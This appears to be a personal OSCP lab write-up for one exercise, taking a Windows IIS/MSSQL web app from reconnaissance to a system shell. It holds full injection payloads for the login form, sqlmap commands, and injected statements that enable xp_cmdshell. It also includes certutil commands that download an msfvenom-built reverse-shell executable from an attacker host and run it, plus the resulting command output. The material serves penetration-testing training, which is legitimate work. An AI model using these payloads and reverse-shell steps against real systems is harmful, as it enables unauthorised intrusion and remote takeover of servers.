---
aliases:
  - SQL Injection
tags:
  - tech
  - cybsec
  - offensive_security
  - offsec
  - oscp
  - web_application
  - web_app
  - sql_injection
  - sqli
author: Mehdi N Tehrani
creat_date: 2023-12-27
category: Cyber Security
subcategory: Offensive Security - OSCP
---

# 10.2.3 Q7
#mssql #sql_server #time_based 
## nmap
```
PORT    STATE SERVICE
80/tcp open  http    Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Convid
|_http-server-header: Microsoft-IIS/10.0

PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022 (88%)
Aggressive OS guesses: Microsoft Windows Server 2022 (88%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.008 days (since Wed Dec 27 12:12:39 2023)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-12-27T01:23:29
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

## ffuf
```
$ ffuf -u "http://192.168.222.50/FUZZ" -w /usr/share/wordlists/dirb/common.txt -r

                        [Status: 200, Size: 18818, Words: 6497, Lines: 369, Duration: 306ms]
css                     [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 304ms]
fonts                   [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 306ms]
Images                  [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 289ms]
images                  [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 289ms]
js                      [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 326ms]
master                  [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 275ms]
```

## sqli
#mssql #time_based 
```
POST /login.aspx HTTP/1.1
Host: 192.168.222.50

ctl00%24ContentPlaceHolder1%24UsernameTextBox=admin'%3b+IF+1%3d1+waitfor+delay+'0%3a0%3a5'+else+select+'&ctl00%24ContentPlaceHolder1%24PasswordTextBox=setsfsd+fs&ctl00%24ContentPlaceHolder1%24LoginButton=Login
```

attack string entered as user:
`admin'%3b+IF+1%3d1+waitfor+delay+'0%3a0%3a5'+else+select+'`


## sqlmap
#sqlmap #dump_dbs
### dbs
```
$ sqlmap -r ./login.req --dbms=mssql -D webapp --tables 

available databases [4]:
[*] model
[*] msdb
[*] tempdb
[*] webapp
```

### DB webapp tables
#dump_tables #dump_table
```
$ sqlmap -r ./login.req --dbms=mssql -D webapp --tables --batch
dbo.users
Database: webapp
[1 table]
+-------+
| users |
+-------+

$ sqlmap -r ./login.req --dbms=mssql -D webapp -T users --dump --batch
Database: webapp
Table: users
[0 entries]
+----------+----------+
| password | username |
+----------+----------+
+----------+----------+
```


## Enable xp_cmdshell
#xp_cmdshell 
```
EXECUTE sp_configure 'show advanced options',1;
RECONFIGURE
EXECUTE sp_configure 'xp_cmdshell',1;
RECONFIGURE
```

URL param:
```
&ctl00%24ContentPlaceHolder1%24UsernameTextBox=admin'%3bexecute+sp_configure+'show+advanced+options',1%3breconfigure%3bexecute+sp_configure+'xp_cmdshell',1%3breconfigure%3bwaitfor+delay+'0:0:5'%3B+select+'&
```

## Remote Command Execution
#rce
```
POST /login.aspx HTTP/1.1
Host: 192.168.222.50
...

__VIEWSTATE=%2FwEPDwUKMjA3MTgxMTM4Nw9kFgJmD2QWAgIDD2QWAgIBD2QWAgIHDw8WAh4EVGV4dAUmSW52YWxpZCBjcmVkZW50aWFscy4gUGxlYXNlIHRyeSBhZ2Fpbi5kZGQBPTdMqS5Ul3SMNtGtg%2FP%2FyY%2F9wvvPLFKzxx1KQ5PYkQ%3D%3D&__VIEWSTATEGENERATOR=C2EE9ABB&__EVENTVALIDATION=%2FwEdAAQA5q3sooTDd3D4bXwYKaPSG8sL8VA5%2Fm7gZ949JdB2tEE%2BRwHRw9AX2%2FIZO4gVaaKVeG6rrLts0M7XT7lmdcb6SyIHr1g9J2ichD%2BsXBOsOsW4EtI0XDMY3uBxZiCrp80%3D&ctl00%24ContentPlaceHolder1%24UsernameTextBox=admin'%3b+execute+xp_cmdshell+'certutil.exe+-urlcache+-f+http%3a//192.168.45.216/%25tmp%25+test.txt'%3Bwaitfor+delay+'0:0:5'%3B+select+'&ctl00%24ContentPlaceHolder1%24PasswordTextBox=setsfsd+fs&ctl00%24ContentPlaceHolder1%24LoginButton=Login
```


Build rev shell:
```
msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.45.216 lport=7777 -f exe -o sh.exe
```
Download rev shell
```
__VIEWSTATE=%2FwEPDwUKMjA3MTgxMTM4Nw9kFgJmD2QWAgIDD2QWAgIBD2QWAgIHDw8WAh4EVGV4dAUmSW52YWxpZCBjcmVkZW50aWFscy4gUGxlYXNlIHRyeSBhZ2Fpbi5kZGQBPTdMqS5Ul3SMNtGtg%2FP%2FyY%2F9wvvPLFKzxx1KQ5PYkQ%3D%3D&__VIEWSTATEGENERATOR=C2EE9ABB&__EVENTVALIDATION=%2FwEdAAQA5q3sooTDd3D4bXwYKaPSG8sL8VA5%2Fm7gZ949JdB2tEE%2BRwHRw9AX2%2FIZO4gVaaKVeG6rrLts0M7XT7lmdcb6SyIHr1g9J2ichD%2BsXBOsOsW4EtI0XDMY3uBxZiCrp80%3D&ctl00%24ContentPlaceHolder1%24UsernameTextBox=admin'%3b+execute+xp_cmdshell+'certutil.exe+-urlcache+-f+http%3a//192.168.45.216/sh.exe+%tmp%\sh.exe'%3Bwaitfor+delay+'0:0:5'%3B+select+'&ctl00%24ContentPlaceHolder1%24PasswordTextBox=setsfsd+fs&ctl00%24ContentPlaceHolder1%24LoginButton=Login
```
Run Rev Shell:
```
&ctl00%24ContentPlaceHolder1%24UsernameTextBox=admin'%3b+execute+xp_cmdshell+'%tmp%\sh.exe'%3Bwaitfor+delay+'0:0:5'%3B+select+'&
```
Flag:
```
C:\Windows\system32>whoami
nt service\mssql$sqlexpress

C:\>type c:\inetpub\wwwroot\flag.txt
OS{}
```




